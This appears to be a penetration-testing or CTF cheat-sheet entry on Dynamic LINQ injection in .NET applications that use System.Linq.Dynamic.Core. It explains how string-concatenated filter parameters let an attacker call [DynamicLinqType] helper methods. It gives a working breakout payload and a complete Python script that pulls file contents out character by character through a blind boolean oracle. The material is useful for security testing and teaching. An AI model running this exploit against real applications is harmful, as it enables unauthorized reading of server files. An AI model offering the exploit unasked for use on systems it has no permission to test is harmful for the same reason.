# Dynamic LINQ injection (.NET)

Injection into `System.Linq.Dynamic.Core`, which parses a **string** into a LINQ expression tree at runtime. If user input is interpolated into that string, you can break out and call arbitrary methods — including statics/instance methods exposed via `[DynamicLinqType]`.

## When to reach for it

- .NET app where a `search`/`filter`/`orderby` parameter is a string passed to `query.Where(col + search)` / `OrderBy(...)` / `System.Linq.Dynamic.Core`'s `ParseLambda`.
- Error messages or behavior hint that your input is parsed as a LINQ expression (e.g. a `ParseException`, or operators like `Contains`/`StartsWith` behaving oddly).
- The app registers helper types with `[DynamicLinqType]` — those classes' methods become callable from the injected expression.

## How it works

The search string is concatenated into an expression like:

```csharp
query.Where($"{searchBy}.Contains(\"{search}\")")
```

Supplying a value that closes the string and the call lets you append your own boolean expression. Dynamic LINQ permits method calls on whitelisted (`[DynamicLinqType]`) types, so a helper such as `FileHelper.GetFileContent(...)` can be invoked and used as an oracle inside the `Where` clause.

## Minimal steps

1. Identify a `[DynamicLinqType]` helper with a useful method (e.g. file read, comparison) from decompiled source (`dnSpy`) or reflected types.
2. Break out of the string/call and OR in a predicate that evaluates your oracle:
   ```
   zzzz")+or+FileHelper.GetFileContent("flag.txt").StartsWith("<prefix>")+or+Name.Contains("bbbb
   ```
   The trailing `Name.Contains("bbbb` re-balances the expression so the query still parses.
3. Treat a row being returned (a known marker string in the response) as **true** for your guess — blind boolean oracle.
4. Exfiltrate character by character:
   ```python
   import requests
   url = 'http://target/Files?searchBy=Name&search='
   alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_,-}'
   flag = ""
   while True:
       for c in alphabet:
           payload = f'zzzz")+or+FileHelper.GetFileContent("flag.txt").StartsWith("{flag+c}")+or+Name.Contains("bbbb'
           if "cafeteria" in requests.get(url + payload).text:   # marker row present => guess true
               flag += c
               break
       else:
           break
   print(flag)
   ```

## Notes

- Same family as SQLi/code injection: any string parsed into executable semantics is fair game — look for the parser API, not SQL keywords.
- `StartsWith` is an easy prefix oracle; `Contains` needs special chars URL-encoded (`+` for spaces).
- Confirm exact bracket/paren balancing for the target's expression shape; the `bbbb` closer mirrors the original `.Contains("` call.
